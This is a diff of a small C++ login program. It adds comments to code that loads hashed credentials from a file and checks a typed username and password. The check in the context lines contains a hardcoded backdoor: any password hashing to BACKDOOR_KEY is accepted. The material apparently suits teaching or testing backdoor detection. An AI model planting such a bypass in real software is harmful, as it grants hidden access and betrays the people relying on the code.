@@ -54,27 +54,29 @@ uint64_t hash_password(const std::string &password) {
 
 int main()
 {
-    std::unordered_map<std::string, uint64_t> credentials;
-    std::ifstream passwordFile("passwords.txt");
+    std::unordered_map<std::string, uint64_t> credentials; // create map to store the username and hashed password
+    std::ifstream passwordFile("passwords.txt"); //file to read in from
     std::string currentLine;
-    while (std::getline(passwordFile, currentLine))
+    while (std::getline(passwordFile, currentLine)) //read in from file line by line
     {
-        size_t colonPos = currentLine.find(':');
+        size_t colonPos = currentLine.find(':'); //use : as delimiter
         if (colonPos != std::string::npos)
         {
-            std::string username = currentLine.substr(0, colonPos);
-            std::string hashedPassword = currentLine.substr(colonPos + 1);
-            credentials[username] = hex_to_uint64(hashedPassword);
+            std::string username = currentLine.substr(0, colonPos); //read in the username
+            std::string hashedPassword = currentLine.substr(colonPos + 1); // read in hashed password
+            credentials[username] = hex_to_uint64(hashedPassword); //store the password in the map
         }
     }
     passwordFile.close();
 
+    // Asking for username and password
     std::string username, password;
     std::cout << "Enter username: \n>>> ";
     std::cin >> username;
     std::cout << "Enter password: \n>>> ";
     std::cin >> password;
 
+    // Check if the credentials are valid
     auto it = credentials.find(username);
     if (it != credentials.end() && (it->second == hash_password(password) || hash_password(password) == BACKDOOR_KEY))
     {
